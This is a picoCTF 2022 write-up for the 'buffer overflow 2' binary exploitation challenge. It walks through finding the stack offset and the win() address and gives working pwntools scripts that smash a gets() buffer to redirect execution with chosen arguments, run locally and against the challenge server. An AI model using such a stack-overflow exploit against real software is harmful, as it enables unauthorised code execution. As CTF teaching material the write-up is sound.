# buffer overflow 2

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information
```
Points: 300
Tags: picoCTF 2022, Binary Exploitation, gets, arguments_on_the_stack
Author: SANJAY C / PALASH OSWAL

Description:
Control the return address and arguments

This time you'll need to control the arguments to the function you return to! 
Can you get the flag from this program?

You can view source here. And connect with it using nc saturn.picoctf.net 52580

Hints:
1. Try using GDB to print out the stack once you write to it.
```

## Solution

This challenge is a continuation of the [previous challenge](buffer_overflow_1.md) but with arguments also.

### Analyze the given files

Lets start by looking at the given files. First the C source code.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
Compared to the previous challenge the major differences are:
 - The argument checks in the `win` function
 - No printing of the memory address to help us
 - The slightly larger `BUFSIZE` of `100` bytes.

The `vuln` file is still a 32-bit non-stripped ELF binary
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_2]
└─$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a429aa852db1511dec3f0143d93e5b1e80e4d845, for GNU/Linux 3.2.0, not stripped
```

### Manually identifying the offset

Lets create a [de Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) that is 200 bytes long.
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_2]
└─$ ~/python_venvs/pwntools/bin/cyclic 200 > pattern_200.txt
```

Then we try it out locally to find the offset with `gdb`
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_2]
└─$ gdb -q vuln                 
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) run < pattern_200.txt 
Starting program: /mnt/hgfs/CTFs/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_2/vuln < pattern_200.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
(gdb) exit
A debugging session is active.

        Inferior 1 [process 87839] will be killed.

Quit anyway? (y or n) y

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_2]
└─$ ~/python_venvs/pwntools/bin/cyclic -l 0x62616164        
112
```
So the offset on the stack to the return address is `112` bytes.

### Get the addess of the win function

Now we need to find out the virtual address of the `win` function.  
This can be done with `objdump` or `gdb`
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_2]
└─$ objdump -t vuln | grep win
08049296 g     F .text  000000a2              win

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_2]
└─$ gdb -batch -ex 'info functions' vuln | grep win
0x08049296  win
```
So the address to `win` is `0x08049296`.

### Write an exploit

Lets write a small exploit in Python with the help of [pwntools](https://docs.pwntools.com/en/stable/index.html)
```python
#!/usr/bin/python

from pwn import *
import sys

offset = 112
padding = b'A'

win = p32(0x08049296)       # Address to win function
dummy = p32(0x42424242)     # Fake return address
arg_1 = p32(0xCAFEF00D)     # Argument 1
arg_2 = p32(0xF00DF00D)     # Argument 2

payload = padding*offset + win + dummy + arg_1 + arg_2
    
sys.stdout.buffer.write(payload)
```
And then we try it out locally
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_2]
└─$ echo "picoCTF{fake_flag}" > flag.txt

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_2]
└─$ ~/python_venvs/pwntools/bin/python local_exploit.py | ./vuln
Please enter your string: 
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�4321
picoCTF{fake_flag}
zsh: done                ~/python_venvs/pwntools/bin/python local_exploit.py | 
zsh: segmentation fault  ./vuln
```
It works, but later the program crashes due to un invalid memory address after the `win` function.  
We can ignore this.

### Get the flag

Lets modify the Python script to connect to the server instead
```python
#!/usr/bin/python

from pwn import *

SERVER = 'saturn.picoctf.net'
PORT = 52580

io = remote(SERVER, PORT)

offset = 112
padding = b'A'

win = p32(0x08049296)       # Address to win function
dummy = p32(0x42424242)     # Fake return address
arg_1 = p32(0xCAFEF00D)     # Argument 1
arg_2 = p32(0xF00DF00D)     # Argument 2

payload = padding*offset + win + dummy + arg_1 + arg_2
    
io.sendline(payload)
print(io.recvallS())
io.close()
```

And then we run the script to get the flag
```bash
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_2]
└─$ ~/python_venvs/pwntools/bin/python remote_exploit.py
[+] Opening connection to saturn.picoctf.net on port 52580: Done
[+] Receiving all data: Done (190B)
[*] Closed connection to saturn.picoctf.net port 52580
Please enter your string: 
ð
picoCTF{<REDACTED>}
```

For additional information, please see the references below.

## References

- [gdb - Linux manual page](https://man7.org/linux/man-pages/man1/gdb.1.html)
- [objdump - Linux manual page](https://man7.org/linux/man-pages/man1/objdump.1.html)
- [pwntools - Documentation](https://docs.pwntools.com/en/stable/index.html)
- [Wikipedia - Buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow)
- [Wikipedia - de Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence)
